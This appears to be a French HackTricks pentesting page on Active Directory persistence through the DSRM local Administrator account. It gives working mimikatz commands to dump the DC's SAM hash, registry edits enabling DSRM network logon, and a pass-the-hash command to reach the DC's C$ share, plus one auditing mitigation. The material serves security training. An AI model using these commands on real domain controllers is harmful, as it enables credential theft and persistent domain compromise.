# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Il existe un compte **administrateur local** à l'intérieur de chaque **DC**. En disposant de privilèges admin sur cette machine, vous pouvez utiliser mimikatz pour **dump** le **hash de l'Administrator local**. Ensuite, en modifiant le registre afin d'**activer ce mot de passe**, vous pouvez accéder à distance à cet utilisateur Administrator local.\
Nous devons d'abord **dump** le **hash** de l'utilisateur **Administrator local** au sein du DC :
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Ensuite, nous devons vérifier si ce compte fonctionnera, et si la clé de registre a la valeur "0" ou n'existe pas, vous devez la **définir sur "2"** :
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Ensuite, à l’aide d’un PTH, vous pouvez **lister le contenu de C$ ou même obtenir un shell**. Notez que pour créer une nouvelle session powershell avec ce hash en mémoire (pour le PTH), **le "domain" utilisé est simplement le nom de la machine DC :**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Plus d’informations à ce sujet : [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) et [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Mitigation

- Event ID 4657 - Auditer la création/la modification de `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Références

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
